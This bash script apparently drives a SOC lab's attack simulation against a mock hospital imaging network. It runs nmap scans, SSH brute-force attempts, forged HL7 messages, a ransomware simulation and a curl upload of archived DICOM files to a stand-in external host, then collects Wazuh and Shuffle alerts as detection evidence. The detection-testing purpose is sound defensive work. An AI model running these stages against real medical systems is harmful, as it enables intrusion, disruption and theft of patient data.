#!/usr/bin/env bash
# ================================================================
# DIC SOC Lab — Non-interactive Full Attack Chain Runner
# Runs all attack stages and collects detection evidence
# ================================================================
set -euo pipefail

ATTACKER="dic-attacker"
LOG="/tmp/attack_run.log"
exec > >(tee "$LOG") 2>&1

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

header() { echo -e "\n${CYAN}${BOLD}══════════════════════════════════════${NC}"; echo -e "${CYAN}${BOLD}  $*${NC}"; echo -e "${CYAN}${BOLD}══════════════════════════════════════${NC}\n"; }
log()    { echo -e "${GREEN}[+]${NC} $*"; }
warn()   { echo -e "${YELLOW}[!]${NC} $*"; }
err()    { echo -e "${RED}[✗]${NC} $*"; }

# ── Ensure attacker container is running ──────────────────────────
header "Starting Attacker Container"
if ! docker ps --format '{{.Names}}' | grep -q "^${ATTACKER}$"; then
  log "Launching attacker container..."
  docker compose --profile attack up -d attacker
  sleep 4
else
  log "Attacker already running."
fi

run() {
  docker exec "$ATTACKER" bash -c "$1"
}

# ================================================================
# STAGE 1 — Reconnaissance: DICOM Port Scan (T1046)
# ================================================================
header "STAGE 1/5 — T1046: Network Reconnaissance"
warn "MITRE: Discovery / Network Service Discovery"
warn "Expected: Suricata SID 9000002 — NMAP DICOM port scan"
echo ""

log "Running nmap against Medical VLAN..."
run "nmap -sT -sV -p 4242,8042,2575,22,80 10.10.10.10 -T4 2>/dev/null || true
     nmap -sT -p 4242 10.10.10.0/24 --open 2>/dev/null | grep -E 'open|Nmap|report' || true
     echo '[+] Stage 1 complete'" || warn "nmap stage had errors (normal)"

sleep 3

# ================================================================
# STAGE 2 — SSH Brute Force (T1110)
# ================================================================
header "STAGE 2/5 — T1110: SSH Brute Force"
warn "MITRE: Credential Access / Brute Force"
warn "Expected: Wazuh Rule 100005 — SSH brute force Medical VLAN"
echo ""

log "Running 15 failed SSH attempts against PACS (10.10.10.10)..."
run "
  for i in \$(seq 1 15); do
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
        -o PasswordAuthentication=yes \
        -o BatchMode=no \
        wronguser@10.10.10.10 exit 2>&1 | head -1 || true
    echo \"  Attempt \$i/15 — authentication failed\"
    sleep 0.4
  done
  echo '[+] 15 failed SSH attempts sent'
" || warn "SSH brute stage had errors (normal — PACS may not have sshd)"

sleep 3

# ================================================================
# STAGE 3 — HL7 Protocol Abuse (T1071)
# ================================================================
header "STAGE 3/5 — T1071: HL7 Protocol Abuse"
warn "MITRE: C2 / Application Layer Protocol"
warn "Expected: Suricata SID 9000020 — HL7 from non-RIS source"
echo ""

log "Sending unauthorized HL7 ADT message to RIS (10.10.10.20:2575)..."
run "
  HL7_MSG='MSH|^~\&|ATTACKER|LAB|RIS|DIC|20260401120000||ADT^A01|MSG001|P|2.3\rPID|||FAKE001||HACKED^PATIENT||19800101|M'
  echo -e \"\${HL7_MSG}\" | nc -w 3 10.10.10.20 2575 && \
    echo '[+] HL7 message sent to RIS' || \
    echo '[*] HL7 connection attempted (Suricata should detect)'

  echo '[*] DICOM C-STORE probe from unauthorized source...'
  echo 'FAKE_DICOM_PROBE' | nc -w 2 10.10.10.10 4242 && \
    echo '[+] DICOM probe sent' || \
    echo '[*] DICOM connection attempted (Suricata SID 9000001)'
" || warn "HL7/DICOM probe stage done"

sleep 3

# ================================================================
# STAGE 4 — Ransomware Simulation (T1486)
# ================================================================
header "STAGE 4/5 — T1486: Ransomware Simulation (DICOM Encryption)"
warn "MITRE: Impact / Data Encrypted for Impact"
warn "Expected: Wazuh Rule 100001 CRITICAL — Mass DICOM modification"
echo ""

log "Generating synthetic DICOM files..."
run "python3 /opt/attacks/generate_dicom.py" || {
  warn "generate_dicom.py not found or failed — creating manual test files..."
  run "
    mkdir -p /opt/dicom_test
    for i in \$(seq 1 20); do
      dd if=/dev/urandom bs=10K count=1 2>/dev/null > /opt/dicom_test/test_\${i}.dcm
    done
    echo '[+] Created 20 test DICOM files'
    ls /opt/dicom_test/*.dcm | wc -l
  " || true
}

sleep 1
log "Running ransomware encryption simulation..."
run "python3 /opt/attacks/ransomware_sim.py" || warn "Ransomware sim returned non-zero (check script)"

sleep 3

# ================================================================
# STAGE 5 — Data Exfiltration (T1041)
# ================================================================
header "STAGE 5/5 — T1041: DICOM Data Exfiltration"
warn "MITRE: Exfiltration / Exfiltration Over C2 Channel"
warn "Expected: Wazuh Rule 100011 — Large outbound transfer"
echo ""

log "Archiving and attempting to exfiltrate DICOM data..."
run "
  cd /opt && tar czf /tmp/dicom_exfil.tar.gz dicom_test/ 2>/dev/null || \
    tar czf /tmp/dicom_exfil.tar.gz /opt/dicom_test/ 2>/dev/null || true
  ls -lh /tmp/dicom_exfil.tar.gz 2>/dev/null && echo '[+] Archive created' || echo '[!] No DICOM files to archive'
  echo '[*] Simulating HTTP POST exfiltration (will fail — RFC5737 test addr)...'
  curl -s -X POST -F 'file=@/tmp/dicom_exfil.tar.gz' \
    http://203.0.113.10:9999/upload --max-time 5 2>&1 || \
    echo '[*] Connection refused (expected) — exfil attempt logged'
" || warn "Exfiltration stage done"

sleep 5

# ================================================================
# EVIDENCE COLLECTION — Wazuh Alerts
# ================================================================
header "EVIDENCE: Wazuh Alert Collection"

log "Checking Wazuh Manager for triggered alerts..."
docker exec dic-wazuh-manager bash -c "
  echo '=== ossec.log last 20 lines ==='
  tail -20 /var/ossec/logs/ossec.log 2>/dev/null

  echo ''
  echo '=== alerts.log (last 30 lines) ==='
  tail -30 /var/ossec/logs/alerts/alerts.log 2>/dev/null || echo 'No alerts.log yet'
" 2>/dev/null || warn "Could not read manager logs"

echo ""
log "Checking Wazuh Indexer for recent alerts (last 10)..."
docker exec dic-wazuh-indexer bash -c "
  curl -sk -u admin:SecretPassword1! \
    'https://localhost:9200/wazuh-alerts-*/_search?pretty&size=10&sort=@timestamp:desc' \
    -H 'Content-Type: application/json' \
    -d '{\"_source\":[\"rule.id\",\"rule.description\",\"rule.level\",\"agent.name\",\"@timestamp\"]}' \
    2>/dev/null | grep -E '\"rule\"|\"agent\"|\"@timestamp\"|\"level\"' | head -60
" 2>/dev/null || warn "Could not query indexer"

# ================================================================
# EVIDENCE COLLECTION — Shuffle Workflow Executions
# ================================================================
header "EVIDENCE: Shuffle Workflow Execution Check"

log "Checking Shuffle for triggered workflow executions..."
docker exec dic-shuffle-database sh -c "
  curl -s 'http://localhost:9200/workflowexecution-000001/_search?pretty&size=10&sort=started_at:desc' \
    -H 'Content-Type: application/json' 2>/dev/null | \
    grep -E '\"status\"|\"workflow_name\"|\"started_at\"|\"result\"' | head -40
" 2>/dev/null || warn "No workflow executions found yet"

log "Checking Shuffle for configured workflows..."
docker exec dic-shuffle-database sh -c "
  curl -s 'http://localhost:9200/workflow-000001/_search?pretty&size=10' 2>/dev/null | \
    grep -E '\"name\"|\"status\"|\"id\"' | head -20
" 2>/dev/null || warn "No workflows configured yet"

# ================================================================
# SUMMARY
# ================================================================
header "ATTACK SIMULATION COMPLETE"
echo ""
echo -e "  ${BOLD}Stages run:${NC}"
echo -e "  ${GREEN}✓${NC} Stage 1: T1046 — DICOM Recon (nmap scan)"
echo -e "  ${GREEN}✓${NC} Stage 2: T1110 — SSH Brute Force (PACS)"
echo -e "  ${GREEN}✓${NC} Stage 3: T1071 — HL7 Protocol Abuse (RIS)"
echo -e "  ${GREEN}✓${NC} Stage 4: T1486 — Ransomware Simulation (DICOM)"
echo -e "  ${GREEN}✓${NC} Stage 5: T1041 — Data Exfiltration"
echo ""
echo -e "  ${BOLD}Check dashboards:${NC}"
echo -e "  ${CYAN}Wazuh:   ${NC}https://localhost  (admin / SecretPassword1!)"
echo -e "  ${CYAN}Shuffle: ${NC}http://localhost:3001  (socadmin / SOCAdmin!2026)"
echo ""
